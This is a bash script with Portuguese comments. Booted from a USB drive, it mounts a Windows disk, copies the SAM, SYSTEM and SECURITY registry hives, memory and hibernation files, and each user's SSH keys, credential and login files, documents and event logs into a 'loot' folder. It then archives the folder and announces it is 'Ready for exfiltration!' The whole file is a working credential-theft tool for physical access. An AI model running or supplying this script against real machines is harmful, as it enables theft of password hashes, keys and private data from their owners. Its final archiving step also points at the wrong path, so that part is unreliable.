#!/bin/bash
set -e

echo "[*] Offline Collector"

DATE=$(date +%Y%m%d_%H%M)
MOUNT_WIN="/mnt/windows"
LOOT_DIR="/mnt/pendrive/mona-collector"

# Remove pasta anterior se existir e cria nova
rm -rf "$LOOT_DIR" 2>/dev/null
mkdir -p "$LOOT_DIR"/{registry,users,enum,memory,logs}

log() {
    echo "[$(date '+%H:%M:%S')] $1"
}

cleanup() {
    umount "$MOUNT_WIN" 2>/dev/null || true
}

error_exit() {
    echo "[ERROR] $1"
    cleanup
    exit 1
}

trap cleanup EXIT

log "[*] Iniciando coleta..."

# Verificações
if [ "$EUID" -ne 0 ]; then
    error_exit "Execute como root"
fi

# Detecta disco Windows
if [ -n "$1" ]; then
    WIN_PART="$1"
else
    WIN_PART=$(lsblk -o NAME,FSTYPE | grep -i ntfs | awk '{print $1}' | head -n1 | sed 's/[├─└│]//g' | tr -d ' ')
    if [ -z "$WIN_PART" ]; then
        error_exit "Partição NTFS não encontrada. Use: $0 /dev/sdXX"
    fi
    WIN_PART="/dev/$WIN_PART"
fi

log "[+] Partição: $WIN_PART"

# Monta disco
mkdir -p "$MOUNT_WIN"
if ! mount -t ntfs-3g -o ro,noexec,nodev,nosuid "$WIN_PART" "$MOUNT_WIN"; then
    # Fallback para mount simples se ntfs-3g não funcionar
    if ! mount -o ro "$WIN_PART" "$MOUNT_WIN"; then
        error_exit "Falha ao montar $WIN_PART"
    fi
fi

if [ ! -d "$MOUNT_WIN/Windows/System32" ]; then
    error_exit "Windows não encontrado"
fi

log "[+] Windows montado"

# Extrai registry
log "[*] Copiando registry..."
REGISTRY_FILES=("SAM" "SYSTEM" "SECURITY" "SOFTWARE")
for reg_file in "${REGISTRY_FILES[@]}"; do
    if [ -f "$MOUNT_WIN/Windows/System32/config/$reg_file" ]; then
        cp "$MOUNT_WIN/Windows/System32/config/$reg_file" "$LOOT_DIR/registry/"
        cp "$MOUNT_WIN/Windows/System32/config/$reg_file.LOG"* "$LOOT_DIR/registry/" 2>/dev/null || true
    fi
done

log "[+] Registry extraído"

# Coleta arquivos de memória (hiberfil, pagefile, dumps)
log "[*] Copiando arquivos de memória..."
mkdir -p "$LOOT_DIR/memory"

# hiberfil.sys - arquivo de hibernação
if [ -f "$MOUNT_WIN/hiberfil.sys" ]; then
    cp "$MOUNT_WIN/hiberfil.sys" "$LOOT_DIR/memory/"
    log "[+] hiberfil.sys copiado ($(du -sh "$LOOT_DIR/memory/hiberfil.sys" | cut -f1))"
fi

# pagefile.sys - arquivo de paginação
if [ -f "$MOUNT_WIN/pagefile.sys" ]; then
    cp "$MOUNT_WIN/pagefile.sys" "$LOOT_DIR/memory/"
    log "[+] pagefile.sys copiado ($(du -sh "$LOOT_DIR/memory/pagefile.sys" | cut -f1))"
fi

# swapfile.sys - arquivo de swap moderno
if [ -f "$MOUNT_WIN/swapfile.sys" ]; then
    cp "$MOUNT_WIN/swapfile.sys" "$LOOT_DIR/memory/"
    log "[+] swapfile.sys copiado ($(du -sh "$LOOT_DIR/memory/swapfile.sys" | cut -f1))"
fi

# MEMORY.DMP - dump completo de memória
if [ -f "$MOUNT_WIN/MEMORY.DMP" ]; then
    cp "$MOUNT_WIN/MEMORY.DMP" "$LOOT_DIR/memory/"
    log "[+] MEMORY.DMP copiado ($(du -sh "$LOOT_DIR/memory/MEMORY.DMP" | cut -f1))"
fi

# Minidumps
if [ -d "$MOUNT_WIN/Windows/Minidump" ]; then
    cp -r "$MOUNT_WIN/Windows/Minidump" "$LOOT_DIR/memory/" 2>/dev/null
    dump_count=$(find "$LOOT_DIR/memory/Minidump" -name "*.dmp" 2>/dev/null | wc -l)
    if [ "$dump_count" -gt 0 ]; then
        log "[+] $dump_count minidumps copiados"
    fi
fi

# Crash dumps do System32
find "$MOUNT_WIN/Windows/System32" -name "*.dmp" -exec cp {} "$LOOT_DIR/memory/" \; 2>/dev/null
sys_dumps=$(find "$LOOT_DIR/memory" -maxdepth 1 -name "*.dmp" | wc -l)
if [ "$sys_dumps" -gt 0 ]; then
    log "[+] $sys_dumps crash dumps copiados"
fi

log "[+] Arquivos de memória processados"

# Coleta dados de usuários
log "[*] Coletando dados de usuários..."
USERS=$(find "$MOUNT_WIN/Users" -maxdepth 1 -type d -not -path "$MOUNT_WIN/Users" | grep -v "All Users\|Default\|Public" || true)

echo "$USERS" | while read -r user_path; do
    if [ -n "$user_path" ] && [ -d "$user_path" ]; then
        username=$(basename "$user_path")
        user_archive="$LOOT_DIR/users/${username}.7z"
        
        cd "$user_path"
        7z a -t7z -mx=9 -ms=on "$user_archive" \
            .ssh/ *.key *.pem *.ppk *.rdp \
            AppData/Local/*/Login* AppData/Roaming/*/credentials* \
            Documents/ Desktop/ > /dev/null 2>&1 || true
    fi
done
log "[+] Usuários processados"

# Enumeração otimizada (apenas diretórios importantes)
log "[*] Enumeração rápida..."
{
    # Busca chaves SSH/TLS apenas em pastas de usuários
    find "$MOUNT_WIN/Users" -type f \( -name "*.key" -o -name "*.pem" -o -name "*ssh*" \) 2>/dev/null | head -10
    
    # Configs com senhas em Program Files e ProgramData
    find "$MOUNT_WIN/Program Files" "$MOUNT_WIN/ProgramData" -name "*.xml" -o -name "*.config" 2>/dev/null | head -20 | xargs grep -l -i "password" 2>/dev/null | head -5
    
    # Backups importantes apenas em Users e raiz
    find "$MOUNT_WIN/Users" "$MOUNT_WIN" -maxdepth 2 -name "*.bak" -o -name "*.backup" 2>/dev/null | head -10
    
    # Arquivos RDP e VPN em Users
    find "$MOUNT_WIN/Users" -name "*.rdp" -o -name "*.ovpn" 2>/dev/null | head -10
} > "$LOOT_DIR/enum/files.txt"

# Copia logs importantes
cp "$MOUNT_WIN/Windows/System32/winevt/Logs/Security.evtx" "$LOOT_DIR/logs/" 2>/dev/null || true
cp "$MOUNT_WIN/Windows/System32/winevt/Logs/System.evtx" "$LOOT_DIR/logs/" 2>/dev/null || true
cp "$MOUNT_WIN/Windows/System32/winevt/Logs/Application.evtx" "$LOOT_DIR/logs/" 2>/dev/null || true

log "[+] Enumeração completa"

# Compressão otimizada
log "[*] Compactando com compressão otimizada..."
cd "$HOME"

# Usa gzip como método principal (mais rápido e confiável)
log "[*] Usando gzip com compressão balanceada..."
GZIP=-6 tar -czf "mona-collector_$DATE.tar.gz" "mona-collector/"
FINAL_FILE="mona-collector_$DATE.tar.gz"

# Finalização
log "[+] Coleta finalizada: $LOOT_DIR"
du -sh "$LOOT_DIR"/*
log "[+] Total original: $(du -sh "$LOOT_DIR" | cut -f1)"
log "[+] Arquivo compactado: $FINAL_FILE"
log "[+] Tamanho final: $(du -sh "$HOME/$FINAL_FILE" | cut -f1)"

# Calcula taxa de compressão
ORIGINAL_SIZE=$(du -sb "$LOOT_DIR" | cut -f1)
COMPRESSED_SIZE=$(du -sb "$HOME/$FINAL_FILE" | cut -f1)
COMPRESSION_RATIO=$((100 - (COMPRESSED_SIZE * 100 / ORIGINAL_SIZE)))
log "[+] Taxa de compressão: ${COMPRESSION_RATIO}%"


echo "               🌸 Data collected successfully! 🌸"
echo "                     File: $FINAL_FILE"
echo "                  Ready for exfiltration! 💖"
echo ""
